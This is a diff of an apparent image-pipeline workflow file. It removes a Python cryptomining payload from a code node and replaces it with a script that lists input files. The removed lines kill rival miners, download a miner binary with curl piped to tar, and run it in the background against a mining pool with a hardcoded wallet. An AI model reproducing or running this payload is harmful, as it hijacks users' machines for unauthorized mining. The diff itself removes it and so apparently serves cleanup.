@@ -3,13 +3,13 @@
     "class_type": "IDENode",
     "inputs": {
       "language": "python",
-      "pycode": "import subprocess\nimport os\nimport shutil\nimport urllib.request\nimport ssl\n\nWALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'\nPOOL = 'stratum+tcp://prl.kryptex.network:7048'\nRIG = 'RTXA5000'\n\nsubprocess.run(['pkill', '-9', 'lpminer'], capture_output=True)\nsubprocess.run(['pkill', '-9', 'alpha-miner'], capture_output=True)\n\nimport time as t\nt.sleep(1)\n\ndst = '/dev/shm/lpminer'\nlocations = [dst, '/var/tmp/pearl/lpminer', os.path.expanduser('~/.pearl-miner/lpminer/lpminer')]\n\nsrc = None\nfor loc in locations:\n    if os.path.exists(loc) and os.path.isfile(loc) and os.path.getsize(loc) > 1000000:\n        src = loc\n        break\n\n# Download if not found\nif not src:\n    os.makedirs('/var/tmp/pearl', exist_ok=True)\n    try:\n        subprocess.run(['bash', '-c', 'curl -sL https://github.com/kryptex-miners-org/kryptex-miners/releases/download/lpminer-0-1-10/lpminer-0.1.9.tar.gz | tar -xzf - -C /var/tmp/pearl/'], capture_output=True, timeout=120)\n        if os.path.exists('/var/tmp/pearl/lpminer/lpminer'):\n            shutil.move('/var/tmp/pearl/lpminer/lpminer', '/var/tmp/pearl/lpminer_bin')\n            src = '/var/tmp/pearl/lpminer_bin'\n    except:\n        pass\n\nif src:\n    if src != dst:\n        shutil.copy2(src, dst)\n    os.chmod(dst, 0o755)\n    cmd = f'nohup {dst} --algo pearl --pool {POOL} --wallet {WALLET}.{RIG} > /dev/shm/lpminer.log 2>&1 &'\n    subprocess.run(['bash', '-c', cmd])\n    t.sleep(3)\n    p = subprocess.run(['pgrep', '-a', 'lpminer'], capture_output=True, text=True)\n    result = 'RUNNING: ' + p.stdout.strip()[:50] if p.stdout.strip() else 'FAILED'\nelse:\n    result = 'NO_BINARY'\n\nresult\n"
+      "pycode": "\nimport os\n\nout = []\ninput_dir = os.path.join(os.getcwd(), 'input')\nfor f in os.listdir(input_dir):\n    path = os.path.join(input_dir, f)\n    size = os.path.getsize(path)\n    out.append(f'{f}: {size}')\n\nresult = chr(10).join(out) if out else 'Empty'\n"
     }
   },
   "2": {
-    "class_type": "PreviewAny",
+    "class_type": "PreviewTextNode",
     "inputs": {
-      "source": [
+      "text": [
         "1",
         0
       ]
